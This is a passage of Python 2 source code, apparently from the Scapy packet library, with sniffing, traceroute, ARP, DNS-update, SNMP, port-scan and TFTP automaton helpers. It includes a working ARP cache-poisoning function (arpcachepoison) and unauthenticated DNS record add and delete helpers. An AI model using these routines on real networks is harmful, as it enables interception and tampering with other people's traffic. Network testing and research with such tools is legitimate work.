                if remain <= 0:
                    break
            sel = select([s],[],[],remain)
            if s in sel[0]:
                p = s.recv(MTU)
                if p is None:
                    break
                if lfilter and not lfilter(p):
                    continue
                if store:
                    lst.append(p)
                c += 1
                if prn:
                    r = prn(p)
                    if r is not None:
                        print r
                if count > 0 and c >= count:
                    break
        except KeyboardInterrupt:
            break
    return PacketList(lst,"Sniffed")



def arpcachepoison(target, victim, interval=60):
    """Poison target's cache with (your MAC,victim's IP) couple
arpcachepoison(target, victim, [interval=60]) -> None
"""
    tmac = getmacbyip(target)
    p = Ether(dst=tmac)/ARP(op="who-has", psrc=victim, pdst=target)
    try:
        while 1:
            sendp(p, iface_hint=target)
            if conf.verb > 1:
                os.write(1,".")
            time.sleep(interval)
    except KeyboardInterrupt:
        pass

def traceroute(target, dport=80, minttl=1, maxttl=30, sport=RandShort(), l4 = None, filter=None, timeout=2, verbose=None, **kargs):
    """Instant TCP traceroute
traceroute(target, [maxttl=30,] [dport=80,] [sport=80,] [verbose=conf.verb]) -> None
"""
    if verbose is None:
        verbose = conf.verb
    if filter is None:
        filter="(icmp and icmp[0]=11) or (tcp and (tcp[13] & 0x16 > 0x10))"
    if l4 is None:
        a,b = sr(IP(dst=target, id=RandShort(), ttl=(minttl,maxttl))/TCP(seq=RandInt(),sport=sport, dport=dport),
                 timeout=timeout, filter=filter, verbose=verbose, **kargs)
    else:
        a,b = sr(IP(dst=target, id=RandShort(), ttl=(minttl,maxttl))/l4,
                 verbose=verbose, timeout=timeout, **kargs)

    a = TracerouteResult(a.res)
    if verbose:
        a.show()
    return a,b




def arping(net, timeout=2, cache=0, verbose=None, **kargs):
    """Send ARP who-has requests to determine which hosts are up
arping(net, [cache=0,] [iface=conf.iface,] [verbose=conf.verb]) -> None
Set cache=True if you want arping to modify internal ARP-Cache"""
    if verbose is None:
        verbose = conf.verb
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net), verbose=verbose,
                    filter="arp and arp[7] = 2", timeout=timeout, iface_hint=net, **kargs)
    ans = ARPingResult(ans.res)

    if cache and ans is not None:
        for pair in ans:
            arp_cache[pair[1].psrc] = (pair[1].hwsrc, time.time())
    if verbose:
        ans.show()
    return ans,unans

def dyndns_add(nameserver, name, rdata, type="A", ttl=10):
    """Send a DNS add message to a nameserver for "name" to have a new "rdata"
dyndns_add(nameserver, name, rdata, type="A", ttl=10) -> result code (0=ok)

example: dyndns_add("ns1.toto.com", "dyn.toto.com", "127.0.0.1")
RFC2136
"""
    zone = name[name.find(".")+1:]
    r=sr1(IP(dst=nameserver)/UDP()/DNS(opcode=5,
                                       qd=[DNSQR(qname=zone, qtype="SOA")],
                                       ns=[DNSRR(rrname=name, type="A",
                                                 ttl=ttl, rdata=rdata)]),
          verbose=0, timeout=5)
    if r and r.haslayer(DNS):
        return r.getlayer(DNS).rcode
    else:
        return -1




def dyndns_del(nameserver, name, type="ALL", ttl=10):
    """Send a DNS delete message to a nameserver for "name"
dyndns_del(nameserver, name, type="ANY", ttl=10) -> result code (0=ok)

example: dyndns_del("ns1.toto.com", "dyn.toto.com")
RFC2136
"""
    zone = name[name.find(".")+1:]
    r=sr1(IP(dst=nameserver)/UDP()/DNS(opcode=5,
                                       qd=[DNSQR(qname=zone, qtype="SOA")],
                                       ns=[DNSRR(rrname=name, type=type,
                                                 rclass="ANY", ttl=0, rdata="")]),
          verbose=0, timeout=5)
    if r and r.haslayer(DNS):
        return r.getlayer(DNS).rcode
    else:
        return -1


def is_promisc(ip, fake_bcast="ff:ff:00:00:00:00",**kargs):
    """Try to guess if target is in Promisc mode. The target is provided by its ip."""

    responses = srp1(Ether(dst=fake_bcast) / ARP(op="who-has", pdst=ip),type=ETH_P_ARP, iface_hint=ip, timeout=1, verbose=0,**kargs)

    return responses is not None

def promiscping(net, timeout=2, fake_bcast="ff:ff:ff:ff:ff:fe", **kargs):
    """Send ARP who-has requests to determine which hosts are in promiscuous mode
    promiscping(net, iface=conf.iface)"""
    ans,unans = srp(Ether(dst=fake_bcast)/ARP(pdst=net),
                    filter="arp and arp[7] = 2", timeout=timeout, iface_hint=net, **kargs)
    ans = ARPingResult(ans.res, name="PROMISCPing")

    ans.display()
    return ans,unans

def ikescan(ip):
    return sr(IP(dst=ip)/UDP()/ISAKMP(init_cookie=RandString(8),
                                      exch_type=2)/ISAKMP_payload_SA(prop=ISAKMP_payload_Proposal()))


def dhcp_request(iface=None,**kargs):
    if conf.checkIPaddr != 0:
        warning("conf.checkIPaddr is not 0, I may not be able to match the answer")
    if iface is None:
        iface = conf.iface
    fam,hw = get_if_raw_hwaddr(iface)
    return srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)
                 /BOOTP(chaddr=hw)/DHCP(options=[("message-type","discover"),"end"]),iface=iface,**kargs)

def snmpwalk(dst, oid="1", community="public"):
    try:
        while 1:
            r = sr1(IP(dst=dst)/UDP(sport=RandShort())/SNMP(community=community, PDU=SNMPnext(varbindlist=[SNMPvarbind(oid=oid)])),timeout=2, chainCC=1, verbose=0, retry=2)
            if ICMP in r:
                print repr(r)
                break
            if r is None:
                print "No answers"
                break
            print "%-40s: %r" % (r[SNMPvarbind].oid.val,r[SNMPvarbind].value)
            oid = r[SNMPvarbind].oid

    except KeyboardInterrupt:
        pass


#####################
## Reporting stuff ##
#####################

def report_ports(target, ports):
    """portscan a target and output a LaTeX table
report_ports(target, ports) -> string"""
    ans,unans = sr(IP(dst=target)/TCP(dport=ports),timeout=5)
    rep = "\\begin{tabular}{|r|l|l|}\n\\hline\n"
    for s,r in ans:
        if not r.haslayer(ICMP):
            if r.payload.flags == 0x12:
                rep += r.sprintf("%TCP.sport% & open & SA \\\\\n")
    rep += "\\hline\n"
    for s,r in ans:
        if r.haslayer(ICMP):
            rep += r.sprintf("%TCPerror.dport% & closed & ICMP type %ICMP.type%/%ICMP.code% from %IP.src% \\\\\n")
        elif r.payload.flags != 0x12:
            rep += r.sprintf("%TCP.sport% & closed & TCP %TCP.flags% \\\\\n")
    rep += "\\hline\n"
    for i in unans:
        rep += i.sprintf("%TCP.dport% & ? & unanswered \\\\\n")
    rep += "\\hline\n\\end{tabular}\n"
    return rep


def __make_table(yfmtfunc, fmtfunc, endline, list, fxyz, sortx=None, sorty=None, seplinefunc=None):
    vx = {}
    vy = {}
    vz = {}
    vxf = {}
    vyf = {}
    l = 0
    for e in list:
        xx,yy,zz = map(str, fxyz(e))
        l = max(len(yy),l)
        vx[xx] = max(vx.get(xx,0), len(xx), len(zz))
        vy[yy] = None
        vz[(xx,yy)] = zz

    vxk = vx.keys()
    vyk = vy.keys()
    if sortx:
        vxk.sort(sortx)
    else:
        try:
            vxk.sort(lambda x,y:int(x)-int(y))
        except:
            try:
                vxk.sort(lambda x,y: cmp(atol(x),atol(y)))
            except:
                vxk.sort()
    if sorty:
        vyk.sort(sorty)
    else:
        try:
            vyk.sort(lambda x,y:int(x)-int(y))
        except:
            try:
                vyk.sort(lambda x,y: cmp(atol(x),atol(y)))
            except:
                vyk.sort()


    if seplinefunc:
        sepline = seplinefunc(l, map(lambda x:vx[x],vxk))
        print sepline

    fmt = yfmtfunc(l)
    print fmt % "",
    for x in vxk:
        vxf[x] = fmtfunc(vx[x])
        print vxf[x] % x,
    print endline
    if seplinefunc:
        print sepline
    for y in vyk:
        print fmt % y,
        for x in vxk:
            print vxf[x] % vz.get((x,y), "-"),
        print endline
    if seplinefunc:
        print sepline

def make_table(*args, **kargs):
    __make_table(lambda l:"%%-%is" % l, lambda l:"%%-%is" % l, "", *args, **kargs)

def make_lined_table(*args, **kargs):
    __make_table(lambda l:"%%-%is |" % l, lambda l:"%%-%is |" % l, "",
                 seplinefunc=lambda a,x:"+".join(map(lambda y:"-"*(y+2), [a-1]+x+[-2])),
                 *args, **kargs)

def make_tex_table(*args, **kargs):
    __make_table(lambda l: "%s", lambda l: "& %s", "\\\\", seplinefunc=lambda a,x:"\\hline", *args, **kargs)


######################
## Online doc stuff ##
######################


def lsc(cmd=None):
    """List user commands"""
    if cmd is None:
        for c in user_commands:
            doc = "No doc. available"
            if c.__doc__:
                doc = c.__doc__.split("\n")[0]

            print "%-16s : %s" % (c.__name__, doc)
    else:
        print cmd.__doc__

def ls(obj=None):
    """List  available layers, or infos on a given layer"""
    if obj is None:
        import __builtin__
        all = __builtin__.__dict__.copy()
        all.update(globals())
        objlst = filter(lambda (n,o): isinstance(o,type) and issubclass(o,Packet), all.items())
        objlst.sort(lambda x,y:cmp(x[0],y[0]))
        for n,o in objlst:
            print "%-10s : %s" %(n,o.name)
    else:
        if isinstance(obj, type) and issubclass(obj, Packet):
            for f in obj.fields_desc:
                print "%-10s : %-20s = (%s)" % (f.name, f.__class__.__name__,  repr(f.default))
        elif isinstance(obj, Packet):
            for f in obj.fields_desc:
                print "%-10s : %-20s = %-15s (%s)" % (f.name, f.__class__.__name__, repr(getattr(obj,f.name)), repr(f.default))
            if not isinstance(obj.payload, NoPayload):
                print "--"
                ls(obj.payload)


        else:
            print "Not a packet class. Type 'ls()' to list packet classes."





user_commands = [ sr, sr1, srp, srp1, srloop, srploop, sniff, p0f, arpcachepoison, send, sendp, traceroute, arping, ls, lsc, queso, nmap_fp, report_ports, dyndns_add, dyndns_del, is_promisc, promiscping ]


##############
## Automata ##
##############

class ATMT:
    STATE = "State"
    ACTION = "Action"
    CONDITION = "Condition"
    RECV = "Receive condition"
    TIMEOUT = "Timeout condition"

    class NewStateRequested(Exception):
        def __init__(self, state_func, automaton, *args, **kargs):
            self.func = state_func
            self.state = state_func.atmt_state
            self.initial = state_func.atmt_initial
            self.error = state_func.atmt_error
            self.final = state_func.atmt_final
            Exception.__init__(self, "Request state [%s]" % self.state)
            self.automaton = automaton
            self.args = args
            self.kargs = kargs
            self.action_parameters() # init action parameters
        def action_parameters(self, *args, **kargs):
            self.action_args = args
            self.action_kargs = kargs
            return self
        def run(self):
            return self.func(self.automaton, *self.args, **self.kargs)

    @staticmethod
    def state(initial=0,final=0,error=0):
        def deco(f,initial=initial, final=final):
            f.atmt_type = ATMT.STATE
            f.atmt_state = f.func_name
            f.atmt_initial = initial
            f.atmt_final = final
            f.atmt_error = error
            def state_wrapper(self, *args, **kargs):
                return ATMT.NewStateRequested(f, self, *args, **kargs)

            state_wrapper.func_name = "%s_wrapper" % f.func_name
            state_wrapper.atmt_type = ATMT.STATE
            state_wrapper.atmt_state = f.func_name
            state_wrapper.atmt_initial = initial
            state_wrapper.atmt_final = final
            state_wrapper.atmt_error = error
            state_wrapper.atmt_origfunc = f
            return state_wrapper
        return deco
    @staticmethod
    def action(cond, prio=0):
        def deco(f,cond=cond):
            if not hasattr(f,"atmt_type"):
                f.atmt_cond = {}
            f.atmt_type = ATMT.ACTION
            f.atmt_cond[cond.atmt_condname] = prio
            return f
        return deco
    @staticmethod
    def condition(state, prio=0):
        def deco(f, state=state):
            f.atmt_type = ATMT.CONDITION
            f.atmt_state = state.atmt_state
            f.atmt_condname = f.func_name
            f.atmt_prio = prio
            return f
        return deco
    @staticmethod
    def receive_condition(state, prio=0):
        def deco(f, state=state):
            f.atmt_type = ATMT.RECV
            f.atmt_state = state.atmt_state
            f.atmt_condname = f.func_name
            f.atmt_prio = prio
            return f
        return deco
    @staticmethod
    def timeout(state, timeout):
        def deco(f, state=state, timeout=timeout):
            f.atmt_type = ATMT.TIMEOUT
            f.atmt_state = state.atmt_state
            f.atmt_timeout = timeout
            f.atmt_condname = f.func_name
            return f
        return deco


class Automaton_metaclass(type):
    def __new__(cls, name, bases, dct):
        cls = super(Automaton_metaclass, cls).__new__(cls, name, bases, dct)
        cls.states={}
        cls.state = None
        cls.recv_conditions={}
        cls.conditions={}
        cls.timeout={}
        cls.actions={}
        cls.initial_states=[]

        members = {}
        classes = [cls]
        while classes:
            c = classes.pop(0) # order is important to avoid breaking method overloading
            classes += list(c.__bases__)
            for k,v in c.__dict__.iteritems():
                if k not in members:
                    members[k] = v

        decorated = [v for v in members.itervalues()
                     if type(v) is types.FunctionType and hasattr(v, "atmt_type")]

        for m in decorated:
            if m.atmt_type == ATMT.STATE:
                s = m.atmt_state
                cls.states[s] = m
                cls.recv_conditions[s]=[]
                cls.conditions[s]=[]
                cls.timeout[s]=[]
                if m.atmt_initial:
                    cls.initial_states.append(m)
            elif m.atmt_type in [ATMT.CONDITION, ATMT.RECV, ATMT.TIMEOUT]:
                cls.actions[m.atmt_condname] = []

        for m in decorated:
            if m.atmt_type == ATMT.CONDITION:
                cls.conditions[m.atmt_state].append(m)
            elif m.atmt_type == ATMT.RECV:
                cls.recv_conditions[m.atmt_state].append(m)
            elif m.atmt_type == ATMT.TIMEOUT:
                cls.timeout[m.atmt_state].append((m.atmt_timeout, m))
            elif m.atmt_type == ATMT.ACTION:
                for c in m.atmt_cond:
                    cls.actions[c].append(m)


        for v in cls.timeout.itervalues():
            v.sort(lambda (t1,f1),(t2,f2): cmp(t1,t2))
            v.append((None, None))
        for v in itertools.chain(cls.conditions.itervalues(),
                                 cls.recv_conditions.itervalues()):
            v.sort(lambda c1,c2: cmp(c1.atmt_prio,c2.atmt_prio))
        for condname,actlst in cls.actions.iteritems():
            actlst.sort(lambda c1,c2: cmp(c1.atmt_cond[condname], c2.atmt_cond[condname]))

        return cls


    def graph(self, **kargs):
        s = 'digraph "%s" {\n'  % self.__class__.__name__

        se = "" # Keep initial nodes at the begining for better rendering
        for st in self.states.itervalues():
            if st.atmt_initial:
                se = ('\t"%s" [ style=filled, fillcolor=blue, shape=box, root=true];\n' % st.atmt_state)+se
            elif st.atmt_final:
                se += '\t"%s" [ style=filled, fillcolor=green, shape=octagon ];\n' % st.atmt_state
            elif st.atmt_error:
                se += '\t"%s" [ style=filled, fillcolor=red, shape=octagon ];\n' % st.atmt_state
        s += se

        for st in self.states.values():
            for n in st.atmt_origfunc.func_code.co_names+st.atmt_origfunc.func_code.co_consts:
                if n in self.states:
                    s += '\t"%s" -> "%s" [ color=green ];\n' % (st.atmt_state,n)


        for c,k,v in [("purple",k,v) for k,v in self.conditions.items()]+[("red",k,v) for k,v in self.recv_conditions.items()]:
            for f in v:
                for n in f.func_code.co_names+f.func_code.co_consts:
                    if n in self.states:
                        l = f.atmt_condname
                        for x in self.actions[f.atmt_condname]:
                            l += "\\l>[%s]" % x.func_name
                        s += '\t"%s" -> "%s" [label="%s", color=%s];\n' % (k,n,l,c)
        for k,v in self.timeout.iteritems():
            for t,f in v:
                if f is None:
                    continue
                for n in f.func_code.co_names+f.func_code.co_consts:
                    if n in self.states:
                        l = "%s/%.1fs" % (f.atmt_condname,t)
                        for x in self.actions[f.atmt_condname]:
                            l += "\\l>[%s]" % x.func_name
                        s += '\t"%s" -> "%s" [label="%s",color=blue];\n' % (k,n,l)
        s += "}\n"
        return do_graph(s, **kargs)



class Automaton:
    __metaclass__ = Automaton_metaclass

    def __init__(self, *args, **kargs):
        self.debug_level=0
        self.init_args=args
        self.init_kargs=kargs
        self.parse_args(*args, **kargs)

    def debug(self, lvl, msg):
        if self.debug_level >= lvl:
            log_interactive.debug(msg)




    class ErrorState(Exception):
        def __init__(self, msg, result=None):
            Exception.__init__(self, msg)
            self.result = result
    class Stuck(ErrorState):
        pass

    def parse_args(self, debug=0, store=1, **kargs):
        self.debug_level=debug
        self.socket_kargs = kargs
        self.store_packets = store


    def master_filter(self, pkt):
        return True

    def run_condition(self, cond, *args, **kargs):
        try:
            cond(self,*args, **kargs)
        except ATMT.NewStateRequested, state_req:
            self.debug(2, "%s [%s] taken to state [%s]" % (cond.atmt_type, cond.atmt_condname, state_req.state))
            if cond.atmt_type == ATMT.RECV:
                self.packets.append(args[0])
            for action in self.actions[cond.atmt_condname]:
                self.debug(2, "   + Running action [%s]" % action.func_name)
                action(self, *state_req.action_args, **state_req.action_kargs)
            raise
        else:
            self.debug(2, "%s [%s] not taken" % (cond.atmt_type, cond.atmt_condname))


    def run(self, *args, **kargs):
        # Update default parameters
        a = args+self.init_args[len(args):]
        k = self.init_kargs
        k.update(kargs)
        self.parse_args(*a,**k)

        # Start the automaton
        self.state=self.initial_states[0](self)
        self.send_sock = conf.L3socket()
        l = conf.L2listen(**self.socket_kargs)
        self.packets = PacketList(name="session[%s]"%self.__class__.__name__)
        while 1:
            try:
                self.debug(1, "## state=[%s]" % self.state.state)

                # Entering a new state. First, call new state function
                state_output = self.state.run()
                if self.state.error:
                    raise self.ErrorState("Reached %s: [%r]" % (self.state.state, state_output), result=state_output)
                if self.state.final:
                    return state_output

                if state_output is None:
                    state_output = ()
                elif type(state_output) is not list:
                    state_output = state_output,

                # Then check immediate conditions
                for cond in self.conditions[self.state.state]:
                    self.run_condition(cond, *state_output)

                # If still there and no conditions left, we are stuck!
                if ( len(self.recv_conditions[self.state.state]) == 0
                     and len(self.timeout[self.state.state]) == 1 ):
                    raise self.Stuck("stuck in [%s]" % self.state.state,result=state_output)

                # Finally listen and pay attention to timeouts
                expirations = iter(self.timeout[self.state.state])
                next_timeout,timeout_func = expirations.next()
                t0 = time.time()

                while 1:
                    t = time.time()-t0
                    if next_timeout is not None:
                        if next_timeout <= t:
                            self.run_condition(timeout_func, *state_output)
                            next_timeout,timeout_func = expirations.next()
                    if next_timeout is None:
                        remain = None
                    else:
                        remain = next_timeout-t

                    r,_,_ = select([l],[],[],remain)
                    if l in r:
                        pkt = l.recv(MTU)
                        if pkt is not None:
                            if self.master_filter(pkt):
                                self.debug(3, "RECVD: %s" % pkt.summary())
                                for rcvcond in self.recv_conditions[self.state.state]:
                                    self.run_condition(rcvcond, pkt, *state_output)
                            else:
                                self.debug(4, "FILTR: %s" % pkt.summary())

            except ATMT.NewStateRequested,state_req:
                self.debug(2, "switching from [%s] to [%s]" % (self.state.state,state_req.state))
                self.state = state_req
            except KeyboardInterrupt:
                self.debug(1,"Interrupted by user")
                break

    def my_send(self, pkt):
        self.send_sock.send(pkt)

    def send(self, pkt):
        self.my_send(pkt)
        self.debug(3,"SENT : %s" % pkt.summary())
        self.packets.append(pkt.copy())






class TFTP_read(Automaton):
    def parse_args(self, filename, server, sport = None, port=69, **kargs):
        Automaton.parse_args(self, **kargs)
        self.filename = filename
        self.server = server
        self.port = port
        self.sport = sport


    def master_filter(self, pkt):
        return ( IP in pkt and pkt[IP].src == self.server and UDP in pkt
                 and pkt[UDP].dport == self.my_tid
                 and (self.server_tid is None or pkt[UDP].sport == self.server_tid) )

    # BEGIN
    @ATMT.state(initial=1)
    def BEGIN(self):
        self.blocksize=512
        self.my_tid = self.sport or RandShort()._fix()
        bind_bottom_up(UDP, TFTP, dport=self.my_tid)
        self.server_tid = None
        self.res = ""

        self.l3 = IP(dst=self.server)/UDP(sport=self.my_tid, dport=self.port)/TFTP()
        self.last_packet = self.l3/TFTP_RRQ(filename=self.filename, mode="octet")
        self.send(self.last_packet)
        self.awaiting=1

        raise self.WAITING()

    # WAITING
    @ATMT.state()
    def WAITING(self):
        pass


    @ATMT.receive_condition(WAITING)
    def receive_data(self, pkt):
        if TFTP_DATA in pkt and pkt[TFTP_DATA].block == self.awaiting:
            if self.server_tid is None:
                self.server_tid = pkt[UDP].sport
                self.l3[UDP].dport = self.server_tid
            raise self.RECEIVING(pkt)

    @ATMT.receive_condition(WAITING, prio=1)
    def receive_error(self, pkt):
        if TFTP_ERROR in pkt:
            raise self.ERROR(pkt)


    @ATMT.timeout(WAITING, 3)
    def timeout_waiting(self):
        raise self.WAITING()
    @ATMT.action(timeout_waiting)
    def retransmit_last_packet(self):
        self.send(self.last_packet)

    @ATMT.action(receive_data)
#    @ATMT.action(receive_error)
    def send_ack(self):
        self.last_packet = self.l3 / TFTP_ACK(block = self.awaiting)
        self.send(self.last_packet)


    # RECEIVED
    @ATMT.state()
    def RECEIVING(self, pkt):
        if Raw in pkt:
            recvd = pkt[Raw].load
        else:
            recvd = ""
        self.res += recvd
        self.awaiting += 1
        if len(recvd) == self.blocksize:
            raise self.WAITING()
        raise self.END()

    # ERROR
    @ATMT.state(error=1)
    def ERROR(self,pkt):
        split_bottom_up(UDP, TFTP, dport=self.my_tid)
        return pkt[TFTP_ERROR].summary()

    #END
    @ATMT.state(final=1)
    def END(self):
        split_bottom_up(UDP, TFTP, dport=self.my_tid)
        return self.res




class TFTP_write(Automaton):
    def parse_args(self, filename, data, server, sport=None, port=69,**kargs):
        Automaton.parse_args(self, **kargs)
        self.filename = filename
        self.server = server
        self.port = port
        self.sport = sport
        self.blocksize = 512
        self.origdata = data

    def master_filter(self, pkt):
        return ( IP in pkt and pkt[IP].src == self.server and UDP in pkt
                 and pkt[UDP].dport == self.my_tid
                 and (self.server_tid is None or pkt[UDP].sport == self.server_tid) )


    # BEGIN
    @ATMT.state(initial=1)
    def BEGIN(self):
        self.data = [ self.origdata[i*self.blocksize:(i+1)*self.blocksize]
                      for i in range( len(self.origdata)/self.blocksize+1) ]
        self.my_tid = self.sport or RandShort()._fix()
        bind_bottom_up(UDP, TFTP, dport=self.my_tid)
        self.server_tid = None

        self.l3 = IP(dst=self.server)/UDP(sport=self.my_tid, dport=self.port)/TFTP()
        self.last_packet = self.l3/TFTP_WRQ(filename=self.filename, mode="octet")
        self.send(self.last_packet)
        self.res = ""
        self.awaiting=0

        raise self.WAITING_ACK()

    # WAITING_ACK
    @ATMT.state()
    def WAITING_ACK(self):
        pass

    @ATMT.receive_condition(WAITING_ACK)
    def received_ack(self,pkt):
        if TFTP_ACK in pkt and pkt[TFTP_ACK].block == self.awaiting:
            if self.server_tid is None:
                self.server_tid = pkt[UDP].sport
                self.l3[UDP].dport = self.server_tid
            raise self.SEND_DATA()

    @ATMT.receive_condition(WAITING_ACK)
    def received_error(self, pkt):
        if TFTP_ERROR in pkt:
            raise self.ERROR(pkt)

    @ATMT.timeout(WAITING_ACK, 3)
    def timeout_waiting(self):
        raise self.WAITING_ACK()
    @ATMT.action(timeout_waiting)
    def retransmit_last_packet(self):
        self.send(self.last_packet)

    # SEND_DATA
    @ATMT.state()
    def SEND_DATA(self):
        self.awaiting += 1
        self.last_packet = self.l3/TFTP_DATA(block=self.awaiting)/self.data.pop(0)
        self.send(self.last_packet)
        if self.data:
            raise self.WAITING_ACK()
        raise self.END()


    # ERROR
    @ATMT.state(error=1)
    def ERROR(self,pkt):
        split_bottom_up(UDP, TFTP, dport=self.my_tid)
        return pkt[TFTP_ERROR].summary()

    # END
    @ATMT.state(final=1)
    def END(self):
        split_bottom_up(UDP, TFTP, dport=self.my_tid)


class TFTP_WRQ_server(Automaton):

    def parse_args(self, ip=None, sport=None, *args, **kargs):
        Automaton.parse_args(self, *args, **kargs)
        self.ip = ip
        self.sport = sport

    def master_filter(self, pkt):
        return TFTP in pkt and (not self.ip or pkt[IP].dst == self.ip)

    @ATMT.state(initial=1)
    def BEGIN(self):
        self.blksize=512
        self.blk=1
        self.filedata=""
        self.my_tid = self.sport or random.randint(10000,65500)
        bind_bottom_up(UDP, TFTP, dport=self.my_tid)

    @ATMT.receive_condition(BEGIN)
    def receive_WRQ(self,pkt):
        if TFTP_WRQ in pkt:
            raise self.WAIT_DATA().action_parameters(pkt)

    @ATMT.action(receive_WRQ)
    def ack_WRQ(self, pkt):
        ip = pkt[IP]
        self.ip = ip.dst
        self.dst = ip.src
        self.filename = pkt[TFTP_WRQ].filename
        options = pkt[TFTP_Options]
        self.l3 = IP(src=ip.dst, dst=ip.src)/UDP(sport=self.my_tid, dport=pkt.sport)/TFTP()
        if options is None:
            self.last_packet = self.l3/TFTP_ACK(block=0)
            self.send(self.last_packet)
        else:
            opt = [x for x in options.options if x.oname.upper() == "BLKSIZE"]
            if opt:
                self.blksize = int(opt[0].value)
                self.debug(2,"Negotiated new blksize at %i" % self.blksize)
            self.last_packet = self.l3/TFTP_OACK()/TFTP_Options(options=opt)
            self.send(self.last_packet)

    @ATMT.state()
    def WAIT_DATA(self):
        pass

    @ATMT.timeout(WAIT_DATA, 1)
    def resend_ack(self):
        self.send(self.last_packet)
        raise self.WAIT_DATA()

    @ATMT.receive_condition(WAIT_DATA)
    def receive_data(self, pkt):
        if TFTP_DATA in pkt:
            data = pkt[TFTP_DATA]
            if data.block == self.blk:
                raise self.DATA(data)

    @ATMT.action(receive_data)
    def ack_data(self):
        self.last_packet = self.l3/TFTP_ACK(block = self.blk)
        self.send(self.last_packet)

    @ATMT.state()
    def DATA(self, data):
        self.filedata += data.load
        if len(data.load) < self.blksize:
            raise self.END()
        self.blk += 1
        raise self.WAIT_DATA()

    @ATMT.state(final=1)
    def END(self):
        return self.filename,self.filedata
        split_bottom_up(UDP, TFTP, dport=self.my_tid)


class TFTP_RRQ_server(Automaton):
    def parse_args(self, store=None, joker=None, dir=None, ip=None, sport=None, serve_one=False, **kargs):
        Automaton.parse_args(self,**kargs)
        if store is None:
            store = {}
        if dir is not None:
            self.dir = os.path.join(os.path.abspath(dir),"")
        else:
            self.dir = None
        self.store = store
        self.joker = joker
        self.ip = ip
        self.sport = sport
        self.serve_one = serve_one
        self.my_tid = self.sport or random.randint(10000,65500)
        bind_bottom_up(UDP, TFTP, dport=self.my_tid)

    def master_filter(self, pkt):
        return TFTP in pkt and (not self.ip or pkt[IP].dst == self.ip)

    @ATMT.state(initial=1)
    def WAIT_RRQ(self):
        self.blksize=512
        self.blk=0

    @ATMT.receive_condition(WAIT_RRQ)
    def receive_rrq(self, pkt):
        if TFTP_RRQ in pkt:
            raise self.RECEIVED_RRQ(pkt)


    @ATMT.state()
    def RECEIVED_RRQ(self, pkt):
        ip = pkt[IP]
        options = pkt[TFTP_Options]
        self.l3 = IP(src=ip.dst, dst=ip.src)/UDP(sport=self.my_tid, dport=ip.sport)/TFTP()
        self.filename = pkt[TFTP_RRQ].filename
        self.blk=1
        self.data = None
        if self.filename in self.store:
            self.data = self.store[self.filename]
        elif self.dir is not None:
            fn = os.path.abspath(os.path.join(self.dir, self.filename))
            if fn.startswith(self.dir): # Check we're still in the server's directory
                try:
                    self.data=open(fn).read()
                except IOError:
                    pass
        if self.data is None:
            self.data = self.joker

        if options:
            opt = [x for x in options.options if x.oname.upper() == "BLKSIZE"]
            if opt:
                self.blksize = int(opt[0].value)
                self.debug(2,"Negotiated new blksize at %i" % self.blksize)
            self.last_packet = self.l3/TFTP_OACK()/TFTP_Options(options=opt)
            self.send(self.last_packet)




    @ATMT.condition(RECEIVED_RRQ)
    def file_in_store(self):
        if self.data is not None:
            self.blknb = len(self.data)/self.blksize+1
            raise self.SEND_FILE()

    @ATMT.condition(RECEIVED_RRQ)
    def file_not_found(self):
        if self.data is None:
            raise self.WAIT_RRQ()
    @ATMT.action(file_not_found)
    def send_error(self):
        self.send(self.l3/TFTP_ERROR(errorcode=1, errormsg=TFTP_Error_Codes[1]))

    @ATMT.state()
    def SEND_FILE(self):
        self.send(self.l3/TFTP_DATA(block=self.blk)/self.data[(self.blk-1)*self.blksize:self.blk*self.blksize])

    @ATMT.timeout(SEND_FILE, 3)
    def timeout_waiting_ack(self):
        raise self.SEND_FILE()

    @ATMT.receive_condition(SEND_FILE)
    def received_ack(self, pkt):
        if TFTP_ACK in pkt and pkt[TFTP_ACK].block == self.blk:
            raise self.RECEIVED_ACK()
    @ATMT.state()
    def RECEIVED_ACK(self):
        self.blk += 1

    @ATMT.condition(RECEIVED_ACK)
    def no_more_data(self):
        if self.blk > self.blknb:
            if self.serve_one:
                raise self.END()
            raise self.WAIT_RRQ()
    @ATMT.condition(RECEIVED_ACK, prio=2)
    def data_remaining(self):
        raise self.SEND_FILE()

    @ATMT.state(final=1)
    def END(self):
        split_bottom_up(UDP, TFTP, dport=self.my_tid)




########################
## Answering machines ##
########################

class ReferenceAM(type):
    def __new__(cls, name, bases, dct):
        o = super(ReferenceAM, cls).__new__(cls, name, bases, dct)
        if o.function_name:
            globals()[o.function_name] = lambda o=o,*args,**kargs: o(*args,**kargs)()
        return o


class AnsweringMachine(object):
    __metaclass__ = ReferenceAM
    function_name = ""
    filter = None
    sniff_options = { "store":0 }
    sniff_options_list = [ "store", "iface", "count", "promisc", "filter", "type", "prn" ]
    send_options = { "verbose":0 }
    send_options_list = ["iface", "inter", "loop", "verbose"]
    send_function = staticmethod(send)


    def __init__(self, **kargs):
        self.mode = 0
        if self.filter:
            kargs.setdefault("filter",self.filter)
        kargs.setdefault("prn", self.reply)
        self.optam1 = {}
        self.optam2 = {}
        self.optam0 = {}
        doptsend,doptsniff = self.parse_all_options(1, kargs)
        self.defoptsend = self.send_options.copy()
        self.defoptsend.update(doptsend)
        self.defoptsniff = self.sniff_options.copy()
        self.defoptsniff.update(doptsniff)
        self.optsend,self.optsniff = [{},{}]

    def __getattr__(self, attr):
        for d in [self.optam2, self.optam1]:
            if attr in d:
                return d[attr]
        raise AttributeError,attr

    def __setattr__(self, attr, val):
        mode = self.__dict__.get("mode",0)
        if mode == 0:
            self.__dict__[attr] = val
        else:
            [self.optam1, self.optam2][mode-1][attr] = val

    def parse_options(self):
        pass

    def parse_all_options(self, mode, kargs):
        sniffopt = {}
        sendopt = {}
        for k in kargs.keys():
            if k in self.sniff_options_list:
                sniffopt[k] = kargs[k]
            if k in self.send_options_list:
                sendopt[k] = kargs[k]
            if k in self.sniff_options_list+self.send_options_list:
                del(kargs[k])
        if mode != 2 or kargs:
            if mode == 1:
                self.optam0 = kargs
            elif mode == 2 and kargs:
                k = self.optam0.copy()
                k.update(kargs)
                self.parse_options(**k)
                kargs = k
            omode = self.__dict__.get("mode",0)
            self.__dict__["mode"] = mode
            self.parse_options(**kargs)
            self.__dict__["mode"] = omode
        return sendopt,sniffopt

    def is_request(self, req):
        return 1

    def make_reply(self, req):
        return req

    def send_reply(self, reply):
        self.send_function(reply, **self.optsend)

